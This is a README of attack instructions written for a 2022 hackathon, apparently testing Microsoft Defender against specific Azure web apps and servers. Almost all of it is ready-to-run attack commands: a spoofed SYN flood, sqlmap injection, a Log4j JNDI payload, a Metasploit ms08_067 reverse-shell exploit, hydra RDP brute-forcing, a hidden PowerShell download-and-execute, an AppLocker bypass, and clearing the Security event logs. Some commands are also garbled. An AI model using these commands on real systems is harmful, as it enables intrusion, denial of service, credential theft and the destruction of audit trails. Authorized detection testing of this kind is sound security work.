# WebSite Attack by AndreMurrel
Web site attack created by Andre Murrel for FTA hackaton Februare 2022

This is instructions on how to execute a website attack. It was created by Andre Murrel for a hackaton played by Rudnei, Andre, Simona, Ricardo, Andrej and Andrew.

### Information utilized

- Web app: https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
- App GW: 52.249.241.69

## Enumeration and Discovery
```
    Nmap -v -O -Pn 52.249.241.69 --traceroute 
    #silent scan of IP and 1000 ports if ICMP is blocked 
```
```
    nikto -h 52.249.241.69 
    //nikto -h https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
    //nikto -h https://owaspdirecprunoavl6xr2y.azurewebsites.net –ssl
```
## ATTACK Attempt at SQL Injection (this throws the kitchen sink at the Website) 
```
    sqlmap -u "https://owaspdirect-prunoavl6xr2y.azurewebsites.net" --data="id=1&str=val" -b 
```
![image](https://user-images.githubusercontent.com/97529152/161347761-6c4a72d3-8c94-4d97-8c78-761c182a9f74.png)

**NOTE:**  
This will NOT be successful but will send a lot of SQL injection and XSS traffic to the WebApp. This will identity that there are NO DBs behind the WebApp.

- Grab header and spoof useragent 
```
curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" http://52.249.241.69
```
![image](https://user-images.githubusercontent.com/97529152/161603891-81c59240-c355-4629-8799-1c42c6a3eb7d.png)

### Login Admin of app 
```
curl -u user:pass -o outfile https://owaspdirect-prunoavl6xr2y.azurewebsites.net/ 
curl -u user:pass -o outfile https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
```
 
### DoS attack 
```
hping3 52.249.241.69  --flood --frag --spoof 20.185.179.183 --destport 443 –syn 
```

![image](https://user-images.githubusercontent.com/97529152/161604741-1f755fd1-3780-406f-8b60-c190741ad160.png)

**NOTE:**
This will run without notifications to you so that you can continue to hack.  

### Capture session Tokens…works on live websites 
```
wget -q --save-cookies=cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" https://owaspdirect-prunoavl6xr2y.azurewebsites.net/login.php 
```
 
**NOTE:**
This works to capture live sessions if the website is active 

### Output Website into HMTL for review and data grab 
```
curl https://owaspdirect-prunoavl6xr2y.azurewebsites.net/file[1-10].txt 
```
![image](https://user-images.githubusercontent.com/97529152/161605398-78fcd307-42c4-4d52-b970-9bf477e62bf7.png)

### Log4j Attempt 
```
curl 52.249.241.69:443 -H X-Api-Version:" ${jndi:ldap://52.249.241.69/a}"localhost:8080 
curl 52.249.241.69:80 -H X-Api-Version:" ${jndi:ldap://52.249.241.69/a}"localhost:8080 
```
 
### Metasploit SMB attack 
```
sudo msfdb init && msfconsole 
```
![image](https://user-images.githubusercontent.com/97529152/161608402-5e6ae3c2-b2c1-43b4-91fd-47c4b0166928.png)

then search ms08-067

![image](https://user-images.githubusercontent.com/97529152/161608672-45c06997-e740-45b5-bf15-0391b6e1ccee.png)

use exploit/windows/smb/ms08_067_netapi 
show options 

![image](https://user-images.githubusercontent.com/97529152/161608915-ac9cc02b-b8ef-4aa7-88cc-2fcecb7224e2.png)
```
set RHOST <Server IP> 
set LHOST 10.1.0.4 
set PAYLOAD windows/meterpreter/reverse_tcp 
set ENCODER x86/shikata_ga_nai
exploit
```

![image](https://user-images.githubusercontent.com/97529152/161609158-d23f30ca-ba25-421e-98fd-2b7dac49e667.png)

### Output Website information 
```
cutycapt --url=https://owaspdirect-prunoavl6xr2y.azurewebsites.net --out= azurewebsites.cer –insecure 
```

## Server Attack

GIVEN 
Server Info 
```
20.127.240.125 
20.127.240.160 
```
 
### BruteForce Servers 
```
cd /usr/share/wordlists 
gzip -d rockyou.txt.gz //if not already unzipped 
head -n 1000 rockyou.txt > user.txt 
head -n 1000 rockyou.txt > pass.txt 
```
![image](https://user-images.githubusercontent.com/97529152/161609807-7d75972d-7d9e-44d1-932c-a9d595313840.png)
```
nano rockyou.txt 
add: 
Rudnei 
Rudnei.com 
Hackathon 
hack 
Adminuser 
Testuser 
admin 
```
Ssave once complete

![image](https://user-images.githubusercontent.com/97529152/161610136-53e2d5b2-4e43-41e5-8974-1b6dba8fd31f.png)
```
hydra -I -L user.txt -P pass.txt <IP of the VictimPC> -t 4 rdp 
```
![image](https://user-images.githubusercontent.com/97529152/161610292-6654ed97-6013-4ee3-9e92-3a07878ee1cd.png)

**NOTE:**
This will take some time but it will start to output soon as it finds a viable user and/or password that can be triggered against a combination.  

### Download File Hash simulation 
```
Nslookup www.eicar.org 
(new-object system.net.weblcient).downloadfile(“http://www.eicar.org/download/eicar.com”, “desktop”) 
``` 

### Testing App Locker  
```
regsvr32.exe /s /u /i:test.sct Microsoft.Web.Deployment.Tracing.dll 
```
**NOTE:**
Run this on a Machine connected to Defender for Cloud through agent Services 
 

### Defender for Endpoint and Defender for Cloud remote Shell execution 
```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe' 
```

**NOTE:**
On the Windows machine connected to MDE and MDC run: 

 

### Clear Security Event Logs (Obfuscation techniques) 
```
Get-Eventlog -list 
Clear-Eventlog -logname Security -computername <Server Name> 
```
